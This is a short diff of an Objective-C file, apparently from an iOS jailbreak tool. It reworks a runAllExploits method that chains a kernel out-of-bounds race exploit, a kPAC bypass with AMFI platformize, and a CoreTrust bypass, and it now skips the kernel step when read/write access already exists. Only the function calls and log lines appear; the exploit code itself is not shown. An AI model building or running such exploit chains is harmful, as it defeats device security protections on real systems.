@@ -373,9 +373,9 @@ static const CGFloat kMargin = 20.0;
 
 - (void)runAllExploits
 {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        printf("[runAllExploits] === Starting exploits ===\n");
+    printf("[runAllExploits] === Starting exploits ===\n");
 
+    if (!kexploit_krw_ready()) {
         printf("[runAllExploits] Step 1: Kernel exploit (OOB race)...\n");
         int r = kexploit_opa334();
         if (r != 0) {
@@ -383,21 +383,23 @@ static const CGFloat kMargin = 20.0;
             return;
         }
         printf("[runAllExploits] Kernel r/w acquired\n");
+    } else {
+        printf("[runAllExploits] Kernel r/w already available, skipping kexploit\n");
+    }
 
-        printf("[runAllExploits] Step 2: kPAC bypass + AMFI platformize...\n");
-        if (!kpac_platformize_self()) {
-            printf("[runAllExploits] kpac_platformize_self failed\n");
-            return;
-        }
+    printf("[runAllExploits] Step 2: kPAC bypass + AMFI platformize...\n");
+    if (!kpac_platformize_self()) {
+        printf("[runAllExploits] kpac_platformize_self failed\n");
+        return;
+    }
 
-        printf("[runAllExploits] Step 3: CoreTrust bypass...\n");
-        if (!coretrust_bypass_all()) {
-            printf("[runAllExploits] coretrust_bypass_all failed\n");
-            return;
-        }
+    printf("[runAllExploits] Step 3: CoreTrust bypass...\n");
+    if (!coretrust_bypass_all()) {
+        printf("[runAllExploits] coretrust_bypass_all failed\n");
+        return;
+    }
 
-        printf("[runAllExploits] === All exploits completed ===\n");
-    });
+    printf("[runAllExploits] === All exploits completed ===\n");
 }
 
 #pragma mark - Community
